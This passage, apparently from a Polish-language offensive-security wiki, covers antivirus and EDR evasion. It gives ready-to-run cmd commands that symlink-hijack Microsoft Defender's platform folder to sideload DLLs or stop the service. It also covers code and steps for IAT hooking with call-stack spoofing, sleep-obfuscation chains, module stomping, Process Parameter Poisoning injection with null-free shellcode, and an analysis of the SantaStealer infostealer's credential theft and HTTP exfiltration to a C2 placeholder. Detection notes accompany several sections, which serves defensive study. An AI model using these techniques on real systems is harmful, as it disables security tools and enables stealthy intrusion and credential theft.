- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach zawierających security tooling, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której działa, poprzez enumerowanie podfolderów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia stamtąd procesy service Defendera (odpowiednio aktualizując ścieżki service/registry). Ta selekcja ufa wpisom katalogów, w tym directory reparse points (symlinks). Administrator może wykorzystać to do przekierowania Defendera do ścieżki zapisywalnej przez attackera i uzyskania DLL sideloading lub zakłócenia działania service.<sup>[[21]](#references)[[22]](#references)</sup>

Warunki wstępne
- Local Administrator (wymagany do tworzenia katalogów/symlinks w folderze Platform)
- Możliwość wykonania reboot lub wywołania ponownej selekcji platformy Defendera (restart service podczas bootu)
- Wymagane są wyłącznie wbudowane tools (mklink)

Dlaczego to działa
- Defender blokuje zapisy we własnych folderach, ale jego selekcja platformy ufa wpisom katalogów i wybiera leksykograficznie najwyższą wersję bez sprawdzania, czy target rozwiązuje się do chronionej/zaufanej ścieżki.

Krok po kroku (przykład)
1) Przygotuj zapisywalny clone bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform dowiązanie symboliczne do katalogu o wyższej wersji, wskazujące na Twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) uruchamia się ze przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Należy zaobserwować nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestr odzwierciedlające tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Upuść/zastąp biblioteki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz powyższą sekcję: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym uruchomieniu skonfigurowana ścieżka nie mogła zostać rozwiązana, a Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Należy pamiętać, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły Red Team mogą przenieść runtime evasion z implantu C2 bezpośrednio do modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, position-independent code (PIC). Uogólnia to evasion poza niewielki zestaw API udostępniany przez wiele kitów (np. CreateProcessA) i rozszerza te same zabezpieczenia na BOFs oraz post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście wysokiego poziomu
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (poprzedzającego moduł lub towarzyszącego mu). PIC musi być self-contained i position-independent.
- Podczas ładowania host DLL przejdź przez jego IMAGE_IMPORT_DESCRIPTOR i zmodyfikuj wpisy IAT dla wybranych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na cienkie wrappery PIC.
- Każdy wrapper PIC wykonuje evasion przed wykonaniem tail-call do adresu prawdziwego API. Typowe techniki evasion obejmują:
- Maskowanie/odmaskowanie pamięci wokół wywołania (np. szyfrowanie regionów beacon, zmiana RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
- Call-stack spoofing: skonstruowanie benign stack i przejście do docelowego API, aby analiza call stacku rozpoznawała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Dla zapewnienia kompatybilności wyeksportuj interfejs, aby skrypt Aggressor (lub odpowiednik) mógł rejestrować API do hookowania dla Beacon, BOFs i post-ex DLLs.

Dlaczego w tym przypadku IAT hooking
- Działa dla każdego kodu korzystającego z hookowanego importu, bez modyfikowania kodu narzędzia i bez polegania na Beacon w zakresie proxy dla określonych API.
- Obejmuje post-ex DLLs: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować to samo maskowanie/stack evasion do ich wywołań API.
- Przywraca niezawodne użycie post-ex commands uruchamiających procesy w obliczu detekcji opartych na call stacku, przez opakowanie CreateProcessA/W.

Minimalny szkic IAT hooka (pseudokod x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relokacjach/ASLR i przed pierwszym użyciem importu. Reflective loaders, takie jak TitanLdr/AceLdr, pokazują hooking podczas DllMain załadowanego modułu.
- Utrzymuj wrappers jako małe i PIC-safe; rozwiąż prawdziwe API za pomocą oryginalnej wartości IAT przechwyconej przed patchowaniem albo przez LdrGetProcedureAddress.
- Stosuj przejścia RW → RX dla PIC i unikaj pozostawiania stron jednocześnie zapisywalnych i wykonywalnych.

Call‑stack spoofing stub
- Stub-y PIC w stylu Draugr budują fałszywy łańcuch wywołań (adresy powrotu wskazujące na benign modules), a następnie wykonują pivot do prawdziwego API.
- Udaremnia to detekcje oczekujące canonical stacks z Beacon/BOFs do wrażliwych API.
- Połącz to z technikami stack cutting/stack stitching, aby wejść wewnątrz oczekiwanych frames przed prologiem API.

Integracja operacyjna
- Dodaj reflective loader przed post-ex DLLs, aby PIC i hooks inicjalizowały się automatycznie po załadowaniu DLL.
- Użyj Aggressor script do zarejestrowania docelowych API, aby Beacon i BOFs w sposób transparentny korzystały z tej samej ścieżki evasion bez zmian w kodzie.

Uwagi dotyczące detekcji/DFIR
- Integralność IAT: wpisy rozwiązujące się do adresów non-image (heap/anon); okresowa weryfikacja import pointers.
- Anomalie stosu: adresy powrotu nienależące do załadowanych images; nagłe przejścia do non-image PIC; niespójna ancestry RtlUserThreadStart.
- Telemetria loadera: zapisy wewnątrz procesu do IAT, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane regiony RX tworzone podczas ładowania.
- Evasion ładowania images: jeśli hooking dotyczy LoadLibrary*, monitoruj podejrzane ładowania automation/clr assemblies skorelowane ze zdarzeniami memory masking.

Powiązane building blocks i przykłady
- Reflective loaders wykonujące IAT patching podczas ładowania (np. TitanLdr, AceLdr)
- Memory masking hooks (np. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (np. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera `GetProcAddress` własnym resolverem, który najpierw sprawdza hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **resident PICO** (persistent PIC object), który przetrwa po zwolnieniu transient loader PIC.
- Wyeksportuj funkcję `setup_hooks()`, która nadpisuje import resolver loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj ordinal imports i użyj hash-based hook lookup, takiego jak `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie przekaż wywołanie do prawdziwego `GetProcAddress`.
- Zarejestruj hook targets w czasie linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje poprawny, ponieważ znajduje się wewnątrz resident PICO.

Zapewnia to **import-time IAT redirection** bez patchowania sekcji kodu załadowanej DLL po załadowaniu.

### Wymuszanie hookable imports, gdy target używa PEB-walking

Import-time hooks uruchamiają się tylko wtedy, gdy funkcja rzeczywiście znajduje się w IAT targetu. Jeśli moduł rozwiązuje API przez PEB-walk + hash (bez wpisu importu), wymuś rzeczywisty import, aby ścieżka `ProcessImports()` loadera go wykryła:

- Zastąp hashed export resolution (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Compiler wygeneruje wpis IAT, umożliwiając interception, gdy reflective loader rozwiązuje importy.

### Ekko-style sleep/idle obfuscation bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste wait/IPC primitives**, których używa implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w obfuscation chain w stylu Ekko, który szyfruje image w pamięci podczas idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer` do zaplanowania sekwencji callbacks wywołujących `NtContinue` z przygotowanymi frames `CONTEXT`.
- Typowy chain (x64): ustaw image na `PAGE_READWRITE` → zaszyfruj RC4 za pomocą `advapi32!SystemFunction032` na całym mapped image → wykonaj blocking wait → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza template `CONTEXT`; sklonuj go do wielu frames i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy krok.

Szczegół operacyjny: zwracaj “success” dla długich waits (np. `WAIT_OBJECT_0`), aby caller kontynuował działanie, gdy image jest zamaskowany. Wzorzec ten ukrywa moduł przed scannerami podczas idle windows i pozwala uniknąć klasycznej sygnatury “patched `Sleep()`”.

Pomysły dotyczące detekcji (oparte na telemetrii)
- Bursts callbacks `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buffers o rozmiarze image.
- `VirtualProtect` dla dużego zakresu, po którym następuje niestandardowe przywracanie uprawnień poszczególnych sekcji.

### Runtime CFG registration dla sleep-obfuscation gadgets

Na targets z włączonym CFG pierwszy indirect jump do mid-function gadget, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje crash procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadget nie występuje w CFG metadata modułu. Aby utrzymać chains w stylu Ekko/Kraken w hardened processes:<sup>[[30]](#references)</sup>

- Zarejestruj każdy indirect destination używany przez chain za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- Dla adresów wewnątrz loaded images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **image base** i obejmować **pełny rozmiar image**.
- Dla manually mapped/PIC/stomped regions użyj **allocation base** i zamiast tego rozmiaru allocation.
- Oznacz nie tylko dispatch gadget, lecz także exports osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) oraz wszystkie attacker-controlled executable sections, które staną się indirect targets.

Zmienia to sleep chains w stylu ROP/JOP z “works only in non-CFG processes” w reusable primitive dla `explorer.exe`, browsers, `svchost.exe` i innych endpoints skompilowanych z `/guard:cf`.

### CET-safe stack spoofing dla sleeping threads

Pełna zamiana `CONTEXT` jest głośna i może nie działać na systemach z CET Shadow Stack, ponieważ spoofed `Rip` nadal musi zgadzać się z hardware shadow stack. Bezpieczniejszy pattern sleep-masking to:<sup>[[30]](#references)</sup>

- Wybierz inny thread w tym samym procesie i odczytaj bounds stosu `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Wykonaj backup prawdziwego TEB/TIB bieżącego threadu.
- Przechwyć prawdziwy sleeping context za pomocą `GetThreadContext`.
- Skopiuj **tylko** prawdziwy `Rip` do spoof context, pozostawiając spoofed `Rsp`/stack state bez zmian.
- Podczas sleep window skopiuj `NT_TIB` spoof threadu do bieżącego TEB, aby stack walkers rozwijali stos wewnątrz legitimate stack range.
- Po zakończeniu wait przywróć oryginalny TIB i thread context.

Zachowuje to CET-consistent instruction pointer, jednocześnie wprowadzając w błąd EDR stack walkers, które ufają stack metadata TEB podczas walidowania unwinds.

### APC-based alternative: Kraken Mask

Jeśli timer-queue dispatch ma zbyt charakterystyczną sygnaturę, tę samą sekwencję sleep-encrypt-spoof-restore można wykonać z suspended helper thread za pomocą queued APCs:<sup>[[27]](#references)</sup>

- Utwórz helper thread z `NtTestAlert` jako entrypoint.
- Umieść przygotowane `CONTEXT` frames/APCs w kolejce za pomocą `NtQueueApcThread` i opróżniaj je przez `NtAlertResumeThread`.
- Przechowuj chain state na heap zamiast na helper stack, aby uniknąć wyczerpania domyślnego 64 KB thread stack.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować start event i zablokować wykonanie.
- Wstrzymaj main thread przed przywróceniem TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), aby zmniejszyć race window, w którym scanner mógłby przechwycić częściowo odtworzony stos.

Zastępuje to sygnaturę `CreateTimerQueueTimer` + `NtContinue` sygnaturą helper-thread/APC, zachowując te same cele RC4 masking i stack-spoofing.

Dodatkowe pomysły dotyczące detekcji
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed sleeps, waits lub APC dispatch.
- `GetThreadContext`/`SetThreadContext` opakowane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do bounds stosu TEB/TIB bieżącego threadu.
- Chains `NtQueueApcThread`/`NtAlertResumeThread`, które pośrednio docierają do `SystemFunction032`, `VirtualProtect` lub helpers przywracających uprawnienia sekcji.
- Powtarzające się użycie krótkich gadget signatures, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako dispatch pivots wewnątrz signed modules.


## Precision Module Stomping

Module stomping wykonuje payloady z **sekcji `.text` DLL już zmapowanej wewnątrz target process**, zamiast alokować oczywistą private executable memory lub ładować nową sacrificial DLL. Wybrany target powinien być **loaded, disk-backed image**, którego code space może pomieścić payload bez uszkadzania code paths nadal potrzebnych procesowi.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Naive stomping przeciwko common modules, takim jak `uxtheme.dll` lub `comctl32.dll`, jest fragile: DLL może nie być załadowana w remote process, a zbyt mały code region spowoduje crash procesu. Bardziej reliable workflow wygląda następująco:

1. Wylicz modules target process i zachowaj **names-only include list** już załadowanych DLLs.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj candidate DLLs na dysku i porównaj PE section **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. Ma to większe znaczenie niż file size, ponieważ odzwierciedla rozmiar executable section **po zmapowaniu w pamięci**.
4. Przeparsuj **Export Address Table (EAT)** i wybierz RVA exported function jako stomp start offset.
5. Oblicz **blast radius**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiednie exports ułożone za nią w pamięci.

Typowe helpers do recon/selection spotykane w praktyce:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Uwagi operacyjne
- Preferuj biblioteki DLL **już załadowane** w zdalnym procesie, aby uniknąć telemetrycznego śladu `LoadLibrary`/nieoczekiwanego ładowania obrazów.
- Preferuj eksporty, które są rzadko wykonywane przez aplikację docelową; w przeciwnym razie standardowe ścieżki kodu mogą trafić na zmodyfikowane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode z literału stringowego na **tablicę bajtów/inicjalizator klamrowy**, aby cały bufor był prawidłowo reprezentowany w kodzie injectora.

Pomysły na detekcję
- Zdalne zapisy do **wykonywalnych stron wspieranych przez obraz** (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast częściej spotykanych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie odpowiadają zawartości pliku bazowego na dysku.
- Zdalne wątki lub pivots kontekstu rozpoczynające wykonywanie wewnątrz legalnego eksportu DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` wykonywane na stronach `.text` DLL, po których następuje utworzenie wątku.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **process-injection / EDR-evasion**, która omija klasyczną ścieżkę zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już uruchomionego celu, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je wewnątrz `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na poisoning kopiowane przez `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktyczne ograniczenia nośników:

- `lpCommandLine` musi wskazywać na **zapisywalną pamięć** dla `CreateProcessW` i jest ograniczony do **32 767 znaków Unicode**, włącznie z terminatorem null.
- `lpEnvironment` musi być blokiem środowiska Unicode zawierającym kolejne stringi `NAME=VALUE\0`, zakończonym dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu normalne tworzenie procesu staje się **primitive transferu payloadu**. Operator tworzy proces potomny z kontrolowanymi przez atakującego danymi startowymi i pozwala Windows wykonać kopiowanie między procesami.

### Przepływ zdalnego wyszukiwania bez zdalnych API zapisu

Po utworzeniu procesu potomnego rozwiąż adres skopiowanego bufora za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → uzyskaj `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podąż za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimalny przepływ:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Wykonywanie skopiowanego bufora parametrów

Skopiowany region parametrów jest zazwyczaj `RW`, a nie wykonywalny. Typowy chain P3 wygląda następująco:

1. Utwórz proces normalnie (nie jako suspended)
2. Ustaw wybraną stronę parametrów jako wykonywalną za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisanie `RIP`)

W odróżnieniu od klasycznych workflows związanych z thread hijacking, nie wymaga to `SuspendThread` / `ResumeThread`; context można zmienić bezpośrednio na zwróconym uchwycie głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie związane z null bytes i staged shellcode

Wszystkie trzy carriers zawierają **string lub dane podobne do stringów**, dlatego raw payload zawierający `0x00` zostaje obcięty podczas transferu. Praktycznym obejściem jest **null-free first stage**, który rekonstruuje constants w runtime, a następnie ładuje dowolny second stage.

Prosty pattern polega na syntezie constants z użyciem XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Umożliwia to pierwszemu etapowi tworzenie ciągów dla stosu, argumentów API, ścieżek DLL lub loadera shellcode drugiego etapu bez osadzania bajtów null w transportowanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić string/bufor na stosie celu
- zarezerwować **32-bajtową przestrzeń cienia x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względne względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Następnie drugi etap może zostać skopiowany ze stosu do alokacji `PAGE_READWRITE`, zmienionej na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect`, po czym można wykonać skok do drugiego etapu, unikając bezpośredniej alokacji RWX.

### Pomysły dotyczące detekcji

Dobre możliwości threat huntingu wspomniane przez autorów:

- `VirtualProtectEx` / `NtProtectVirtualMemory` ustawiające **strony parametrów procesu jako wykonywalne**
- zmiana ochrony, po której następuje `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w polach `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **technika transferu między procesami**, a nie pełny primitive wykonawczy: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- `RtlCreateProcessReflection` / Dirty Vanity zostało rozważone przez autorów, ale odrzucone, ponieważ wewnętrznie korzysta z podejrzanych primitives, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Tradecraft SantaStealer w zakresie fileless evasion i kradzieży danych uwierzytelniających

SantaStealer (aka BluelineStealer) pokazuje, jak współczesne info-stealery łączą AV bypass, anti-analysis i credential access w ramach jednego workflow.<sup>[[24]](#references)</sup>

### Filtrowanie według układu klawiatury i opóźnienie w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli zostanie znaleziony układ cyrylicki, sample tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nigdy nie detonuje się w wykluczonych lokalizacjach, pozostawiając jednocześnie artefakt przydatny w threat huntingu.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa logika `check_antivm`

- Variant A przechodzi przez listę procesów, haszuje każdą nazwę za pomocą niestandardowej sumy kontrolnej kroczącej i porównuje ją z wbudowanymi blocklistami debuggerów/sandboxów; powtarza obliczanie sumy kontrolnej dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Variant B analizuje właściwości systemu (minimalną liczbę procesów, niedawny czas działania), wywołuje `OpenServiceA("VBoxGuest")` w celu wykrycia dodatków VirtualBox i wykonuje kontrole czasu wokół operacji sleep, aby wykryć single-stepping. Każde trafienie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + double ChaCha20 reflective loading

- Główny DLL/EXE zawiera Chromium credential helper, który jest albo zapisywany na dysku, albo ręcznie mapowany w pamięci; w trybie fileless samodzielnie rozwiązuje importy/relokacje, dzięki czemu żadne artefakty helpera nie są zapisywane.
- Ten helper przechowuje DLL drugiego etapu, dwukrotnie zaszyfrowany za pomocą ChaCha20 (dwa klucze 32-bajtowe + 12-bajtowe nonce). Po obu etapach blob jest ładowany refleksyjnie (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, wyprowadzone z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator używają direct-syscall reflective process hollowing do injectowania do działającej przeglądarki Chromium, dziedziczą klucze AppBound Encryption i odszyfrowują hasła/cookies/karty kredytowe bezpośrednio z baz SQLite pomimo hardeningu ABE.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iteruje po globalnej tabeli wskaźników funkcji `memory_generators` i tworzy po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, browser extensions itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i zgłasza liczbę plików po około 45-sekundowym oknie `join`.
- Po zakończeniu całość jest kompresowana za pomocą statycznie linkowanej biblioteki `miniz` jako `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` wykonuje sleep przez 15 s i przesyła archiwum strumieniowo w fragmentach po 10 MB za pomocą HTTP POST do `http://<C2>:6767/upload`, podszywając się pod granicę przeglądarki `multipart/form-data` (`----WebKitFormBoundary***`). Każdy fragment dodaje `User-Agent: upload`, `auth: <build_id>`, opcjonalnie `w: <campaign_tag>`, a ostatni fragment dołącza `complete: true`, aby C2 wiedział, że ponowne składanie zostało zakończone.

## Referencje

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
